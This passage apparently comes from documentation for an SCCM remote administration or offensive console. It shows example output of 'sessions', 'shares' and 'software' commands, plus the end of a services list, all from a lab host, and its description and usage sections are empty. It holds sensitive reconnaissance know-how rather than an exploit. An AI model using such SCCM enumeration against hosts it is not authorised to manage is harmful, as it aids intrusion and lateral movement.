                    | vds                                      | C:\Windows\System32\vds.exe                                                              |           0 | Own Process   | False     | DP       |                       
                    +------------------------------------------+------------------------------------------------------------------------------------------+-------------+---------------+-----------+----------+                       
                    | VGAuthService                            | "C:\Program Files\VMware\VMware Tools\VMware VGAuth\VGAuthService.exe"                   |        2100 | Own Process   | True      | DP       |                       
                    +------------------------------------------+------------------------------------------------------------------------------------------+-------------+---------------+-----------+----------+                       
                    | vm3dservice                              | C:\Windows\system32\vm3dservice.exe                                                      |        2112 | Own Process   | True      | DP       |                       
                    +------------------------------------------+------------------------------------------------------------------------------------------+-------------+---------------+-----------+----------+                       
                    | vmicguestinterface                       | C:\Windows\system32\svchost.exe -k LocalSystemNetworkRestricted -p                       |           0 | Share Process | False     | DP       |                       
                    +------------------------------------------+------------------------------------------------------------------------------------------+-------------+---------------+-----------+----------+                       
                    | vmicheartbeat                            | C:\Windows\system32\svchost.exe -k ICService -p                                          |           0 | Share Process | False     | DP       |                       
                    +------------------------------------------+------------------------------------------------------------------------------------------+-------------+---------------+-----------+----------+                       
                    | vmickvpexchange                          | C:\Windows\system32\svchost.exe -k LocalSystemNetworkRestricted -p                       |           0 | Share Process | False     | DP       |                       
                    +------------------------------------------+------------------------------------------------------------------------------------------+-------------+---------------+-----------+----------+                       
                    | vmicshutdown                             | C:\Windows\system32\svchost.exe -k LocalSystemNetworkRestricted -p                       |           0 | Share Process | False     | DP       |                       
                    +------------------------------------------+------------------------------------------------------------------------------------------+-------------+---------------+-----------+----------+                       
                    | vmictimesync                             | C:\Windows\system32\svchost.exe -k LocalServiceNetworkRestricted -p                      |           0 | Share Process | False     | DP       |                       
                    +------------------------------------------+------------------------------------------------------------------------------------------+-------------+---------------+-----------+----------+                       
                    | vmicvmsession                            | C:\Windows\system32\svchost.exe -k LocalSystemNetworkRestricted -p                       |           0 | Share Process | False     | DP       |                       
                    +------------------------------------------+------------------------------------------------------------------------------------------+-------------+---------------+-----------+----------+                       
                    | vmicvss                                  | C:\Windows\system32\svchost.exe -k LocalSystemNetworkRestricted -p                       |           0 | Share Process | False     | DP       |                       
                    +------------------------------------------+------------------------------------------------------------------------------------------+-------------+---------------+-----------+----------+                       
                    | VMTools                                  | "C:\Program Files\VMware\VMware Tools\vmtoolsd.exe"                                      |        1444 | Own Process   | True      | DP       |                       
                    +------------------------------------------+------------------------------------------------------------------------------------------+-------------+---------------+-----------+----------+                       
                    | vmvss                                    | C:\Windows\system32\dllhost.exe /Processid:{37DEF8EB-B25B-4A4C-BCB6-FFDC7D810309}        |           0 | Own Process   | False     | DP       |                       
                    +------------------------------------------+------------------------------------------------------------------------------------------+-------------+---------------+-----------+----------+                       
                    | VSS                                      | C:\Windows\system32\vssvc.exe                                                            |           0 | Own Process   | False     | DP       |                       
                    +------------------------------------------+------------------------------------------------------------------------------------------+-------------+---------------+-----------+----------+                       
                    | W32Time                                  | C:\Windows\system32\svchost.exe -k LocalService                                          |         968 | Share Process | True      | DP       |                       
                    +------------------------------------------+------------------------------------------------------------------------------------------+-------------+---------------+-----------+----------+                       
                    | w3logsvc                                 | C:\Windows\system32\svchost.exe -k apphost                                               |           0 | Share Process | False     | DP       |                       
                    +------------------------------------------+------------------------------------------------------------------------------------------+-------------+---------------+-----------+----------+                       
                    | W3SVC                                    | C:\Windows\system32\svchost.exe -k iissvcs                                               |        2040 | Share Process | True      | DP       |                       
                    +------------------------------------------+------------------------------------------------------------------------------------------+-------------+---------------+-----------+----------+                       
                    | WaaSMedicSvc                             | C:\Windows\system32\svchost.exe -k wusvcs -p                                             |           0 | Share Process | False     | DP       |                       
                    +------------------------------------------+------------------------------------------------------------------------------------------+-------------+---------------+-----------+----------+                       
                    | WalletService                            | C:\Windows\System32\svchost.exe -k appmodel -p                                           |           0 | Share Process | False     | DP       |                       
                    +------------------------------------------+------------------------------------------------------------------------------------------+-------------+---------------+-----------+----------+                       
                    | WarpJITSvc                               | C:\Windows\System32\svchost.exe -k LocalServiceNetworkRestricted                         |           0 | Own Process   | False     | DP       |                       
                    +------------------------------------------+------------------------------------------------------------------------------------------+-------------+---------------+-----------+----------+                       
                    | WAS                                      | C:\Windows\system32\svchost.exe -k iissvcs                                               |        2040 | Share Process | True      | DP       |                       
                    +------------------------------------------+------------------------------------------------------------------------------------------+-------------+---------------+-----------+----------+                       
                    | WbioSrvc                                 | C:\Windows\system32\svchost.exe -k WbioSvcGroup                                          |           0 | Share Process | False     | DP       |                       
                    +------------------------------------------+------------------------------------------------------------------------------------------+-------------+---------------+-----------+----------+                       
                    | Wcmsvc                                   | C:\Windows\system32\svchost.exe -k LocalServiceNetworkRestricted -p                      |        1420 | Own Process   | True      | DP       |                       
                    +------------------------------------------+------------------------------------------------------------------------------------------+-------------+---------------+-----------+----------+                       
                    | WdiServiceHost                           | C:\Windows\System32\svchost.exe -k LocalService -p                                       |           0 | Share Process | False     | DP       |                       
                    +------------------------------------------+------------------------------------------------------------------------------------------+-------------+---------------+-----------+----------+                       
                    | WdiSystemHost                            | C:\Windows\System32\svchost.exe -k LocalSystemNetworkRestricted -p                       |           0 | Share Process | False     | DP       |                       
                    +------------------------------------------+------------------------------------------------------------------------------------------+-------------+---------------+-----------+----------+                       
                    | WdNisSvc                                 | "C:\Program Files\Windows Defender\NisSrv.exe"                                           |           0 | Own Process   | False     | DP       |                       
                    +------------------------------------------+------------------------------------------------------------------------------------------+-------------+---------------+-----------+----------+                       
                    | Wecsvc                                   | C:\Windows\system32\svchost.exe -k NetworkService -p                                     |           0 | Share Process | False     | DP       |                       
                    +------------------------------------------+------------------------------------------------------------------------------------------+-------------+---------------+-----------+----------+                       
                    | WEPHOSTSVC                               | C:\Windows\system32\svchost.exe -k WepHostSvcGroup                                       |           0 | Share Process | False     | DP       |                       
                    +------------------------------------------+------------------------------------------------------------------------------------------+-------------+---------------+-----------+----------+                       
                    | wercplsupport                            | C:\Windows\System32\svchost.exe -k netsvcs -p                                            |           0 | Share Process | False     | DP       |                       
                    +------------------------------------------+------------------------------------------------------------------------------------------+-------------+---------------+-----------+----------+                       
                    | WerSvc                                   | C:\Windows\System32\svchost.exe -k WerSvcGroup                                           |           0 | Own Process   | False     | DP       |                       
                    +------------------------------------------+------------------------------------------------------------------------------------------+-------------+---------------+-----------+----------+                       
                    | WiaRpc                                   | C:\Windows\system32\svchost.exe -k LocalSystemNetworkRestricted -p                       |           0 | Share Process | False     | DP       |                       
                    +------------------------------------------+------------------------------------------------------------------------------------------+-------------+---------------+-----------+----------+                       
                    | WinDefend                                | "C:\Program Files\Windows Defender\MsMpEng.exe"                                          |           0 | Own Process   | False     | DP       |                       
                    +------------------------------------------+------------------------------------------------------------------------------------------+-------------+---------------+-----------+----------+                       
                    | WinHttpAutoProxySvc                      | C:\Windows\system32\svchost.exe -k LocalServiceNetworkRestricted -p                      |         788 | Share Process | True      | DP       |                       
                    +------------------------------------------+------------------------------------------------------------------------------------------+-------------+---------------+-----------+----------+                       
                    | Winmgmt                                  | C:\Windows\system32\svchost.exe -k netsvcs -p                                            |        1296 | Share Process | True      | DP       |                       
                    +------------------------------------------+------------------------------------------------------------------------------------------+-------------+---------------+-----------+----------+                       
                    | WinRM                                    | C:\Windows\System32\svchost.exe -k NetworkService -p                                     |        1100 | Share Process | True      | DP       |                       
                    +------------------------------------------+------------------------------------------------------------------------------------------+-------------+---------------+-----------+----------+                       
                    | wisvc                                    | C:\Windows\system32\svchost.exe -k netsvcs -p                                            |           0 | Share Process | False     | DP       |                       
                    +------------------------------------------+------------------------------------------------------------------------------------------+-------------+---------------+-----------+----------+                       
                    | wlidsvc                                  | C:\Windows\system32\svchost.exe -k netsvcs -p                                            |           0 | Share Process | False     | DP       |                       
                    +------------------------------------------+------------------------------------------------------------------------------------------+-------------+---------------+-----------+----------+                       
                    | WLMS                                     | C:\Windows\system32\wlms\wlms.exe                                                        |        2120 | Own Process   | True      | DP       |                       
                    +------------------------------------------+------------------------------------------------------------------------------------------+-------------+---------------+-----------+----------+                       
                    | wmiApSrv                                 | C:\Windows\system32\wbem\WmiApSrv.exe                                                    |           0 | Own Process   | False     | DP       |                       
                    +------------------------------------------+------------------------------------------------------------------------------------------+-------------+---------------+-----------+----------+                       
                    | WMPNetworkSvc                            | "C:\Program Files\Windows Media Player\wmpnetwk.exe"                                     |           0 | Own Process   | False     | DP       |                       
                    +------------------------------------------+------------------------------------------------------------------------------------------+-------------+---------------+-----------+----------+                       
                    | WPDBusEnum                               | C:\Windows\system32\svchost.exe -k LocalSystemNetworkRestricted                          |           0 | Share Process | False     | DP       |                       
                    +------------------------------------------+------------------------------------------------------------------------------------------+-------------+---------------+-----------+----------+                       
                    | WpnService                               | C:\Windows\system32\svchost.exe -k netsvcs -p                                            |        1296 | Share Process | True      | DP       |                       
                    +------------------------------------------+------------------------------------------------------------------------------------------+-------------+---------------+-----------+----------+                       
                    | WSearch                                  | C:\Windows\system32\SearchIndexer.exe /Embedding                                         |           0 | Own Process   | False     | DP       |                       
                    +------------------------------------------+------------------------------------------------------------------------------------------+-------------+---------------+-----------+----------+                       
                    | wuauserv                                 | C:\Windows\system32\svchost.exe -k netsvcs -p                                            |           0 | Share Process | False     | DP       |                       
                    +------------------------------------------+------------------------------------------------------------------------------------------+-------------+---------------+-----------+----------+                       
(16777221) (C:\) >> 
```

# sessions
### Description
### Usage
### Example
```
(16777221) (C:\) >> sessions
[19:50:29] INFO     Tasked SCCM to show users currently signed in to 16777221.                                                                                                                                                         
[19:50:31] INFO     Got OperationId 16779679. Sleeping 10 seconds to wait for host to call home.                                                                                                                                       
[19:50:41] INFO     +---------------------+----------+                                                                                                                                                                                 
                    | UserName            | Device   |                                                                                                                                                                                 
                    +=====================+==========+                                                                                                                                                                                 
                    | DP\DefaultAppPool   | DP       |                                                                                                                                                                                 
                    +---------------------+----------+                                                                                                                                                                                 
                    | DP\IUSR             | DP       |                                                                                                                                                                                 
                    +---------------------+----------+                                                                                                                                                                                 
                    | DP\LOCAL SERVICE    | DP       |                                                                                                                                                                                 
                    +---------------------+----------+                                                                                                                                                                                 
                    | DP\NETWORK SERVICE  | DP       |                                                                                                                                                                                 
                    +---------------------+----------+                                                                                                                                                                                 
                    | LAB\Administrator   | DP       |                                                                                                                                                                                 
                    +---------------------+----------+                                                                                                                                                                                 
                    | NT AUTHORITY\SYSTEM | DP       |                                                                                                                                                                                 
                    +---------------------+----------+                                                                                                                                                                                 
(16777221) (C:\) >> 
```
# shares
### Description
### Usage
### Example
```
(16777221) (C:\) >> shares
[19:51:39] INFO     Tasked SCCM to list file shares.                                                                                                                                                                                   
[19:51:41] INFO     Got OperationId 16779680. Sleeping 10 seconds to wait for host to call home.                                                                                                                                       
[19:51:52] INFO     +-----------------+------------------------------------------------------------------+-------------------+------------+----------------+----------+                                                                
                    | Name            | Description                                                      | Path              |       Type | AllowMaximum   | Device   |                                                                
                    +=================+==================================================================+===================+============+================+==========+                                                                
                    | ADMIN$          | Remote Admin                                                     | C:\Windows        | 2147483648 | True           | DP       |                                                                
                    +-----------------+------------------------------------------------------------------+-------------------+------------+----------------+----------+                                                                
                    | C$              | Default share                                                    | C:\               | 2147483648 | True           | DP       |                                                                
                    +-----------------+------------------------------------------------------------------+-------------------+------------+----------------+----------+                                                                
                    | IPC$            | Remote IPC                                                       |                   | 2147483651 | True           | DP       |                                                                
                    +-----------------+------------------------------------------------------------------+-------------------+------------+----------------+----------+                                                                
                    | SCCMContentLib$ | 'Configuration Manager' Content Library for site LAB (1/27/2024) | C:\SCCMContentLib |          0 | True           | DP       |                                                                
                    +-----------------+------------------------------------------------------------------+-------------------+------------+----------------+----------+                                                                
                    | SMSPKGC$        | SMS Site LAB DP 1/27/2024                                        | C:\SMSPKGC$       |          0 | True           | DP       |                                                                
                    +-----------------+------------------------------------------------------------------+-------------------+------------+----------------+----------+                                                                
                    | SMSSIG$         | SMS Site LAB DP 1/27/2024                                        | C:\SMSSIG$        |          0 | True           | DP       |                                                                
                    +-----------------+------------------------------------------------------------------+-------------------+------------+----------------+----------+                                                                
                    | SMS_DP$         | SMS Site LAB DP 1/27/2024                                        | C:\SMS_DP$        |          0 | True           | DP       |                                                                
                    +-----------------+------------------------------------------------------------------+-------------------+------------+----------------+----------+  
```

# software
### Description
### Usage
### Example
```
(16777221) (C:\) >> software 
[19:52:10] INFO     Tasked SCCM to list software installed 16777221.                                                                                                                                                                   
[19:52:12] INFO     Got OperationId 16779681. Sleeping 10 seconds to wait for host to call home.                                                                                                                                       
[19:52:23] INFO     +--------------------------------------------------------------------+-----------------------+------------------+----------+                                                                                       
                    | ProductName                                                        | Publisher             | ProductVersion   | Device   |                                                                                       
                    +====================================================================+=======================+==================+==========+                                                                                       
                    | VMware Tools                                                       | VMware, Inc.          | 12.0.0.19345655  | DP       |                                                                                       
                    +--------------------------------------------------------------------+-----------------------+------------------+----------+                                                                                       
                    | Microsoft Visual C++ 2019 X64 Additional Runtime - 14.29.30133     | Microsoft Corporation | 14.29.30133      | DP       |                                                                                       
                    +--------------------------------------------------------------------+-----------------------+------------------+----------+                                                                                       
                    | Microsoft Visual C++ 2019 X64 Minimum Runtime - 14.29.30133        | Microsoft Corporation | 14.29.30133      | DP       |                                                                                       
                    +--------------------------------------------------------------------+-----------------------+------------------+----------+                                                                                       
                    | Microsoft Visual C++ 2019 X86 Additional Runtime - 14.29.30133     | Microsoft Corporation | 14.29.30133      | DP       |                                                                                       
                    +--------------------------------------------------------------------+-----------------------+------------------+----------+                                                                                       
                    | Microsoft Policy Platform                                          | Microsoft Corporation | 68.1.9086.1017   | DP       |                                                                                       
                    +--------------------------------------------------------------------+-----------------------+------------------+----------+                                                                                       
                    | Microsoft Visual C++ 2019 X86 Minimum Runtime - 14.29.30133        | Microsoft Corporation | 14.29.30133      | DP       |                                                                                       
                    +--------------------------------------------------------------------+-----------------------+------------------+----------+                                                                                       
                    | Configuration Manager Client                                       | Microsoft Corporation | 5.00.9106.1000   | DP       |                                                                                       
                    +--------------------------------------------------------------------+-----------------------+------------------+----------+                                                                                       
                    | Microsoft Edge                                                     | Microsoft Corporation | 121.0.2277.106   | DP       |                                                                                       
                    +--------------------------------------------------------------------+-----------------------+------------------+----------+                                                                                       
                    | Microsoft Edge Update                                              |                       | 1.3.183.29       | DP       |                                                                                       
                    +--------------------------------------------------------------------+-----------------------+------------------+----------+                                                                                       
                    | Microsoft Visual C++ 2015-2019 Redistributable (x64) - 14.29.30133 | Microsoft Corporation | 14.29.30133.0    | DP       |                                                                                       
                    +--------------------------------------------------------------------+-----------------------+------------------+----------+                                                                                       
                    | Microsoft Visual C++ 2015-2019 Redistributable (x86) - 14.29.30133 | Microsoft Corporation | 14.29.30133.0    | DP       |                                                                                       
                    +--------------------------------------------------------------------+-----------------------+------------------+----------+                                                                                       
                    | Microsoft Windows Server 2022 Standard Evaluation                  | Microsoft Corporation | 10.0.20348       | DP       |                                                                                       
                    +--------------------------------------------------------------------+-----------------------+------------------+----------+                                                                                       
(16777221) (C:\) >> 
```







